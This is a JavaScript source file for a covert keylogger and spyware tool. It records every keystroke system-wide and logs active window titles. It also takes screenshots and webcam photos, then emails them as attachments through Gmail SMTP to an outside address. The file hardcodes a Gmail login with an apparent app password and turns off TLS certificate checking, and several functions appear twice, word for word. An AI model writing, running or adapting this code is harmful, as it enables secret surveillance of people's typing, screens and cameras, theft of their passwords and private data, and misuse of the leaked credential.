const nodemailer = require('nodemailer');
const path = require('path');
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const screenshot = require('screenshot-desktop');
const NodeWebcam = require('node-webcam');

// Initialize an empty string to store the current output
let currentOutput = "";

// Variable to track the inactivity timeout
let inactivityTimeout;

let isUpperCase = false;
let capsLockPressed = false;

// Function to update the output
const specialCharacters = {
    '1': '!',
    '2': '@',
    '3': '#',
    '4': '$',
    '5': '%',
    '6': '^',
    '7': '&',
    '8': '*',
    '9': '(',
    '0': ')',
    'DOT': '>',
    'COMMA': '<',
    'MINUS': '_',
    'EQUALS': '+',
    'FORWARD SLASH': '?',
    'SQUARE BRACKET OPEN': '{',
    'SQUARE BRACKET CLOSE': '}',
    'SECTION': '~',
    'QUOTE': '"',
    'SEMICOLON': ':',
    'BACKSLASH': '|',
};

function updateOutput(keyName, shiftState) {
    // checks if the Caps Lock key is pressed
    if (keyName === "CAPS LOCK"){
        capsLockPressed = !capsLockPressed;
        currentOutput += `<CAPS LOCK>`;
        return;
    }

    // Check if the keyName is a number and if the shift key is pressed
    if (/^\d$/.test(keyName) && shiftState) {
        keyName = specialCharacters[keyName] || keyName;
    }

    // Convert the keyName to lowercase
    let enclosedKey;
    if (specialCharacters[keyName]){
        enclosedKey = `<${shiftState ? specialCharacters[keyName] : keyName}>`;
    }
    else if (keyName.match(/^[a-zA-Z]$/)) {
        if (capsLockPressed) {
            enclosedKey = shiftState ? keyName.toLowerCase() : keyName.toUpperCase();
        } else {
            enclosedKey = shiftState ? keyName.toUpperCase() : keyName.toLowerCase();
        }
    } else {
        enclosedKey = specialCharacters[keyName.charCodeAt(0).toString()] || `<${keyName}>`;
    }

    currentOutput += enclosedKey + " ";

    // Clear the entire console
    process.stdout.write('\x1Bc');

    // Write the updated output without the trailing space
    process.stdout.write(currentOutput.trim());

    clearTimeout(inactivityTimeout);
    inactivityTimeout = setTimeout(() => {
        sendLogsByEmail(currentOutput);
        currentOutput = "";
    }, 30000);
}



// Configure nodemailer with SMTP transport
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: 'arjundimanarig09@gmail.com',
        pass: 'oqic lxuk sbdu ufxb'
    },
    tls: {
        rejectUnauthorized: false
    }
});

// Function to send logs via email
function sendLogsByEmail(logs) {
    const mailOptions = {
        from: 'arjundimanarig09@gmail.com',
        to: 'asiancutie.3A@gmail.com',
        subject: 'Keyboard Logs',
        text: logs
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
        }
    });
}

const v = new GlobalKeyboardListener();
const keyState = {}; // Track the state of keys

// v.addListener(function (e) {
//     console.log('Key Event:', e);
// });

// Add a listener to log every key press, but prevent double printing
// v.addListener(function (e) {
//     const keyName = e.name;
//     if (!keyState[keyName]) {
//         updateOutput(keyName); // Update the output
//         keyState[keyName] = true;
//     }
// });
v.addListener(function (e, down) {
    // console.log(e);
    const keyName = e.name;
    if (!keyState[keyName]) {
        updateOutput(keyName, down['LEFT SHIFT'] || down['RIGHT SHIFT']);
        keyState[keyName] = true;
    }
});


// Add a listener to reset the state when a key is released
v.addListener(function (e, down) {
    const keyName = e.name;
    if (!down[keyName]) {
        keyState[keyName] = false;
    }
});

// Capture Windows + Space on Windows and Command + Space on Mac
v.addListener(function (e, down) {
    if (e.name == "<SPACE>" && (down["LEFT META"] || down["RIGHT META"])) {
        // Call your function
        return true;
    }
});

// Capture ALT + F
v.addListener(function (e, down) {
    if (e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
        // Call your function
        return true;
    }
});

// Add a listener that is only called once and demonstrate how to remove it
calledOnce = function (e) {
    console.log("only called once");
    v.removeListener(calledOnce);
};
v.addListener(calledOnce);

const activeWindow = require('active-win');
const fs = require('fs');

let currentWindowTitle = ""; // Store the title of the currently active window/tab

// Function to update the active window information
async function updateActiveWindowInfo() {
    try {
        const windowInfo = await activeWindow();
        const newWindowTitle = windowInfo.title;

        if (newWindowTitle !== currentWindowTitle) {
            // The user has changed tabs or windows, update the information
            const output = `Active Window: ${newWindowTitle}`;
            console.log(output);

            // Update the current window title
            currentWindowTitle = newWindowTitle;

            // Append the active window info to the email text
            currentOutput += output + "\n";
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

// Set an interval to periodically check the active window
const interval = 1000; // Check every 1 second
setInterval(updateActiveWindowInfo, interval);

// Initialize NodeWebcam
const Webcam = NodeWebcam.create({
    width: 1280,
    height: 720,
    quality: 100,
    output: 'jpeg',
    callbackReturn: 'base64',
    device: false,
});


// Function to take screenshot from user's window
async function captureScreenshot() {
    try {
      const timestamp = new Date().getTime();
      const screenshotData = await screenshot({ screen: currentWindowTitle });
      const screenshotFilename = `screenshot-${timestamp}.png`;
      fs.writeFileSync(screenshotFilename, screenshotData, 'base64');
      return screenshotFilename;
    } catch (error) {
      console.error("Error capturing screenshot:", error);
      return null;
    }
  }

// Function to capture an image from the user's camera
function captureCameraImage() {
    return new Promise((resolve, reject) => {
      const timestamp = new Date().getTime();
      const imageFilename = `camera-image-${timestamp}.png`;
  
      Webcam.capture(imageFilename, (err, data) => {
        if (err) {
          console.error("Error capturing camera image:", err);
          reject(err);
        } else {
          resolve(imageFilename);
        }
      });
    });
  }


function saveLogsToFile(logs) {
    const now = new Date();
    const date = now.toLocaleDateString().replace(/\//g, '-');
    const time = now.toLocaleTimeString().replace(/:/g, '-');
    const fileName = `keyboard-logs-${date}-${time}.txt`;

    fs.writeFileSync(fileName, logs);

    return fileName;
}

async function sendLogsByEmail(logs) {
    try {
        const screenshotFilename = await captureScreenshot();
        const cameraImageFilename = await captureCameraImage();
        const logFilename = saveLogsToFile(logs);

        const mailOptions = {
            from: 'arjundimanarig09@gmail.com',
            to: 'asiancutie.3a@gmail.com',
            subject: 'Logs and Images',
            text: 'Please find the attached logs, screenshot, and camera image.',
            attachments: [
                { filename: logFilename, path: logFilename },
                { filename: screenshotFilename, path: screenshotFilename },
                { filename: cameraImageFilename, path: cameraImageFilename },
            ],
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.error('Error sending email:', error);
            } else {
                console.log('Email sent:', info.response);
            }
        });
    } catch (error) {
        console.error('Error capturing images or sending email:', error);
    }
}

function saveLogsToFile(logs) {
    const now = new Date();
    const date = now.toLocaleDateString().replace(/\//g, '-');
    const time = now.toLocaleTimeString().replace(/:/g, '-');
    const fileName = `keyboard-logs-${date}-${time}.txt`;

    fs.writeFileSync(fileName, logs);

    return fileName;
}

async function sendLogsByEmail(logs) {
    try {
        const screenshotFilename = await captureScreenshot();
        const cameraImageFilename = await captureCameraImage();
        const logFilename = saveLogsToFile(logs);

        const mailOptions = {
            from: 'arjundimanarig09@gmail.com',
            to: 'asiancutie.3a@gmail.com',
            subject: 'Logs and Images',
            text: 'Please find the attached logs, screenshot, and camera image.',
            attachments: [
                { filename: logFilename, path: logFilename },
                { filename: screenshotFilename, path: screenshotFilename },
                { filename: cameraImageFilename, path: cameraImageFilename },
            ],
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.error('Error sending email:', error);
            } else {
                console.log('Email sent:', info.response);
            }
        });
    } catch (error) {
        console.error('Error capturing images or sending email:', error);
    }
}

// Usage
const logs = 'Your log content here...'; // Replace with actual log data
sendLogsByEmail(logs);